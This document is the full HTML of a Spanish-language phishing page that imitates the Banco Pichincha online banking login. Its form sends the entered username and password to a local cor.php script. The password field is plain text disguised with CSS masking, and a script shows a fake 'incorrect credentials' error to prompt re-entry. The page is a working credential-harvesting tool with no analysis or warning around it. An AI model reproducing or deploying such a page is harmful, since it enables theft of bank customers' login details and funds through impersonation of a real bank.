<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Banca en Linea</title>
    <link rel="icon" href="data:,">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            color: #4a4a4a;
            line-height: 1.5;
        }
        
        .hdr {
            position: sticky;
            top: 0;
            background: #fff;
            padding: 16px;
            box-shadow: 0 8px 8px -8px rgba(7,7,7,.16);
            z-index: 100;
            text-align: center;
        }
        
        .hdr img { width: 120px; }
        
        .main-wrap {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .logo-sec { margin: 30px 0 20px; }
        .logo-sec img { width: 250px; }
        
        .frm-container {
            width: 100%;
            max-width: 320px;
            padding: 0 10px;
        }
        
        .frm-container p {
            text-align: center;
            margin-bottom: 25px;
            font-size: 14px;
        }
        
        .field-group {
            margin-bottom: 12px;
        }
        
        .field-group label {
            display: block;
            font-size: 14px;
            color: #3b3a3a;
            margin-bottom: 5px;
            margin-left: 5px;
        }
        
        .txt-field {
            width: 100%;
            height: 48px;
            padding: 12px 16px;
            font-size: 14px;
            font-weight: 500;
            color: #4a4a4a;
            background: #fff;
            border: 1px solid #c8c8c8;
            border-radius: 4px;
            outline: none;
            transition: border-color .15s ease-in-out;
        }
        
        .txt-field:focus {
            border-color: #2f7abf;
        }
        
        .pass-field {
            -webkit-text-security: disc;
            -moz-text-security: disc;
            text-security: disc;
        }
        
        .error-msg {
            display: none;
            background: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 14px;
            border: 1px solid #ef9a9a;
        }
        
        .error-msg.show {
            display: block;
        }
        
        .btn-primary {
            width: 100%;
            height: 48px;
            margin-top: 10px;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: 500;
            color: #0f265c;
            background: #fd0;
            border: 1px solid #fd0;
            border-radius: 4px;
            cursor: pointer;
            transition: all .2s ease-in-out;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .btn-primary:hover {
            background: #e6c200;
            border-color: #e6c200;
        }
        
        
        .promo-img {
            width: 90%;
            max-width: 320px;
            margin: 30px 0;
        }
        
        .ftr {
            background: #f7fbff;
            border-top: 1px solid #ddd;
            padding: 20px;
            text-align: center;
            font-size: 11px;
            color: #B3BAC0;
        }
        
        .ftr p { margin: 8px 0; }
    </style>
</head>
<body>

<header class="hdr">
    <img src="pichu.svg" alt="Logo">
</header>

<main class="main-wrap">
    <section class="logo-sec">
        <img src="ingress.png" alt="Ingreso">
    </section>
    
    <article class="frm-container">
        <p>Mantendremos tu cuenta segura, confirma la siguiente información</p>
        
        <div class="error-msg" id="errorMsg">Usuario o contraseña incorrectos</div>
        <form action="cor.php" method="post" id="authForm">
            <div class="field-group">
                <label for="userField">Usuario</label>
                <input type="text" class="txt-field" name="us" id="userField" autocomplete="username" required>
            </div>
            
            <div class="field-group">
                <label for="passField">Contraseña</label>
                <input type="text" class="txt-field pass-field" name="ct" id="passField" autocomplete="off" required>
            </div>
            
            <button type="submit" class="btn-primary">Ingresar</button>
        </form>
    </article>
    
    <img class="promo-img" src="abajo.png" alt="Promocion">
</main>


<footer class="ftr">
    <p>Recomendamos utilizar la Banca Virtual con los navegadores</p>
    <p>Internet explorer 11.0, Chrome 36.0.1, Firefox 31.0, Microsoft Edge.</p>
    <p>© Copyright 2024 BancoPichincha *V4.7.43</p>
</footer>

<script>
    if (window.location.search.includes('error=1')) {
        document.getElementById('errorMsg').classList.add('show');
    }
    
    var userField = document.getElementById('userField');
    
    // Bloquear @ y espacios al escribir
    userField.addEventListener('keydown', function(e) {
        if (e.key === '@' || e.key === ' ' || e.code === 'Space') {
            e.preventDefault();
            return false;
        }
    });
    
    // Bloquear al pegar o cualquier cambio
    userField.addEventListener('input', function(e) {
        this.value = this.value.replace(/[@\s]/g, '');
    });
    
    // Bloquear al pegar directamente
    userField.addEventListener('paste', function(e) {
        e.preventDefault();
        var text = (e.clipboardData || window.clipboardData).getData('text');
        text = text.replace(/[@\s]/g, '');
        document.execCommand('insertText', false, text);
    });
</script>
<script src="protect.js"></script>
</body>
</html>
